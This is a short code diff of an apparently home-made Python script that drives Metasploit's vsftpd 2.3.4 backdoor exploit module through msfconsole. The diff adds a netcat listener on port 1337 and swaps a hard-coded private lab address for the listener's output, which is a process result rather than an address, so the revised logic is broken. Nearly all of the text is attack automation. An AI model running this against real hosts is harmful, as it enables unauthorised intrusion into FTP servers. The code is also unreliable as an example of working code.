@@ -1,7 +1,13 @@
 import subprocess
 
+def listener():
+	target = subprocess.run(["nc", "-lp", "1337"])
+	return target
+
 def generate(target):
 	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
 	subprocess.run(["msfconsole", "-q", "-x", exploit])
 
-generate('192.168.56.109')
+
+target = listener()
+generate(target)
